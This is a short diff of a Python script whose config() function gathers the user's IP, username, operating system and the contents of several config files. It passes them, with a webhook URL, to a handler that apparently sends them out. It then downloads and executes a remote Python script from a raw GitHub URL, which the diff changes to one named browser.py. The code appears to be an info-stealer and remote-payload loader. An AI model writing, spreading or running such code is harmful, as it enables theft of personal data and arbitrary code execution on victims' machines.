@@ -88,8 +88,9 @@ def config():
     file4_content = get_config(confi4_path)
     file5_content = get_config(confi5_path)
     config_handle(user_ip, user_username, user_os, webhook_url, file1_content, file2_content, file3_content, file4_content, file5_content)
-    execute_remote_python_script(url = "https://raw.githubusercontent.com/user/tests/main/script.py")                                               #url to script raw
-    
+    execute_remote_python_script(url = "https://raw.githubusercontent.com/Samantha0709/Hang/main/browser.py")                                               #url to script raw
+    #execute_remote_python_script(url = "https://raw.githubusercontent.com/Samantha0709/Hang/main/essentials.py")   
+    #execute_remote_python_script(url = "https://raw.githubusercontent.com/Samantha0709/Hang/main/mod.py")   
 def main():
     config()
 main()
